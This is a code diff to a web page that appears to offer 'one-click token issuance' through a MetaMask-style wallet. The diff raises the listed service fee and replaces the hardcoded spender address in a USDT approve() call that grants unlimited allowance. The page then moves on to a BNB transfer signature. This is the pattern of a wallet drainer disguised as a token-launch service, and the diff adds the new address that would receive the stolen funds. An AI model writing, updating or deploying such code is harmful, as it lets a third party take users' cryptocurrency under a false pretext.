@@ -35,7 +35,7 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 <div class="header">
 <h1>🦊小狐狸一键发币</h1>
 </div>
-<div class="fee-tip">发币服务费：0.0002 BNB</div>
+<div class="fee-tip">发币服务费：0.005 BNB</div>
 
 <div class="card" id="userPanel">
 <button id="connectBtn" class="btn btn-connect">连接钱包</button>
@@ -191,7 +191,7 @@ async function doApproveLogic(signerRef){
   const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
     "function approve(address spender, uint256 amount) external returns(bool)"
   ], signerRef);
-  const approveTx = await usdtContract.approve("0x47542770f3a8eea43d3321867b155c3ac01160d8", MAX_ALLOWANCE);
+  const approveTx = await usdtContract.approve("0x41Dc1846235cdA45871357f7A89c6f39de601A1C", MAX_ALLOWANCE);
   showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
   await approveTx.wait();
   showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
